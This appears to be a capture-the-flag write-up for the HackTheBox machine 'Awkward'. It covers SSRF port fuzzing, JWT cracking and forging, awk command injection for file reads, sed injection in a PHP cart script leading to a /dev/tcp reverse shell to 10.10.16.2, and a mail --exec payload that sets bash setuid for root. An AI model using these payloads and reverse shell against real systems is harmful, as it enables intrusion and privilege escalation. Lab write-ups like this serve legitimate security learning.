# Awkward

---

## Enumeration


- nmap -> port 22, 80
- 10.129.201.62 -> http://hat-valley.htb/
- Cookie -> token:guest ?
- dirScan -> /hr, change token to admin -> redirected to dashboard
- Found API call /api/staff-details -> add to repeater, remove cookie, send -> passwords
- Cracked password: christopher.jones:`chris123`
- Login chrstopher's acc in dashboard -> found JWT
- Cracked JWT Key: 123beany123 `john --format=HMAC-SHA256 --wordlist=rockyou.txt`

- Hit a wall, or a rabbit hole, so I started tinkering with the other API that was discovered earlier `api/store-status`
- The call was `http://hat-valley.htb/api/store-status?url="http://store.hat-valley.htb"`
- Got a login form but the previously cracked passwords didnt work
- Vulnerable to SSRF! Started Fuzzing internally open ports using ffuf

```zsh
ffuf -u 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"' -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -fw 1


0080                    [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 117ms]
3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 214ms]
8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 103ms]
```

- Found ports 80, 3002, 8080, wasnt open in nmap scan.

---

## Foothold

- port 3002 reveals all API calls, found a new api `api/all-leave` and it's vulnerable to LFI
`exec("awk '/" + user + "/' /var/www/private/leave_requests.csv"`
- now the token secret comes into play, I crafted a token on `jwt.io` with the secret we revealed and the user name:https://gtfobins.github.io/gtfobins/awk/#file-read

`/' /etc/passwd '`

- Worked:

```zsh
curl 'http://hat-valley.htb/api/all-leave' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICcgIiwiaWF0IjoxNTE2MjM5MDIyfQ.9tylijKKGFs_oflVzjygNxrSP9I2Xm47pshOqomJ0rU'
```

- Started reading some files that might be interesting like `/proc/self/environ` and found that LFI is done as www-data
- Finally got `.bashrc` for bean, analyzing it found:

```bash
# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
```

- Found the backup at `/home/bean/Documents/backup/bean_backup_final.tar.gz`, Downloaded it and decompressed it.
- It's bean's home directory, after some manual enumeration, found his password in `.config/xpad/content...`

password is `014mrbeanrules!#P`, tried it for ssh and worked.

---

## Privilege Escalation

- At first I started looking back at the subdomain `store`, and since I'm on the machine and the web server is running `nginx`, I tried reading the .htpasswd file, `admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1`

- The hash is not crackable using rockyou.txt, but the password for bean works for the username admin.
- After some manual enumeration, I found that the root user is periodically running `inotifywait` on /var/www/private which is owned by www-data,
- The subdomain `store` is also owned by www-data, I need a revshell as www-data.
- After scrolling through the site's source code I found an RCE vuln in the `cart_actions.php`, and since I have direct access to the file system, I'll be able to edit the `item_id` on both front and back side of the web app for the check.

```php
//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}
```

- the `sed` command can execute code: https://gtfobins.github.io/gtfobins/sed/
- First I prepared a revshell file:

```bash
bean@awkward:/tmp/pwn$ cat game.sh

#!/bin/bash
bash -i >& /dev/tcp/10.10.16.2/9001 0>&1
```

- Then I added an item to the cart and it appeared in the directory `/cart`

```bash
bean@awkward:/var/www/store/cart$ ls -la
total 12
drwxrwxrwx 2 root     root     4096 Nov 14 04:17 .
drwxr-xr-x 9 root     root     4096 Oct  6 01:35 ..
-rw-r--r-- 1 www-data www-data   96 Nov 14 04:17 90f0-be51-0bc-4463
```

- Since I do not have permission to edit this file, I deleted it and made my own in `/tmp` and moved it here:

```
***Hat Valley Cart***
item_id=1' -e "1e /tmp/game.sh" /tmp/game.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
```

- now I intercepted the request to delete the item and edited the item id to be : `1' -e "1e /tmp/game.sh" /tmp/game.sh '`
- got revshell as www-data
- now I can edit the `/private/leave_requests.csv` file, and It's being read by `mail`: https://gtfobins.github.io/gtfobins/mail/
- Made a posion file to get upgraded bash with root access:

```bash
bean@awkward:/tmp/pwn$ nano priv.sh
bean@awkward:/tmp/pwn$ chmod +x priv.sh
bean@awkward:/tmp/pwn$ cat priv.sh 

#!/bin/bash
chmod +s /bin/bash
```

- Edited this file:

```bash
echo '" --exec="\!/tmp/priv.sh"' >> leave_requests.csv
```

- And now im root!

```bash
bean@awkward:/tmp$ bash -p
bash-5.1# whoami
root
bash-5.1# 
```

---
